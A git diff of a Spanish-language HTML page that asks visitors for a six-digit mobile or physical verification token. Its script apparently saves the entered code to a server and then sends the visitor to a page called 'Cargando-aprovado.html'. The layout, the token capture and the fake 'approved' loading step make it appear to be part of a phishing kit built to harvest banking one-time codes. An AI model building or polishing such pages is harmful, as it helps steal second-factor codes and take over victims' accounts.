@@ -15,7 +15,7 @@
         <img src="MOTO_ANUNCIO.png" alt="Anuncio Moto" class="anuncio">
         <img src="BOTONES_INICIO.png" alt="Botones Inicio" class="botones">
 
-        <h2>Código o Token de verificación</h2>
+        <h2>Token de verificación</h2>
 
         <div class="card">
             <div class="form-icon">
@@ -24,7 +24,7 @@
 
             <form id="tokenForm">
                 <div class="form-group">
-                    <label for="CODIGO">Código SMS o Token móvil / físico</label>
+                    <label for="CODIGO">Token móvil / físico</label>
                     <div class="input-group">
                         <input type="text" id="CODIGO" name="codigo_token" placeholder="••••••" maxlength="6" required style="width: 100%; max-width: 335px;">
                     </div>
@@ -34,7 +34,7 @@
             </form>
 
             <div class="links">
-                <a href="#">No tengo Token / Reenviar código ›</a>
+                <a href="#">No tengo Token›</a>
             </div>
         </div>
     </div>
@@ -62,7 +62,7 @@
                 .then(data => {
                     console.log("Respuesta del servidor:", data);
                     sessionStorage.setItem("enCargando", "true");
-                    window.location.href = "cargando.html";
+                    window.location.href = "Cargando-aprovado.html";
                 })
                 .catch(error => console.error("Error al guardar el código:", error));
             });
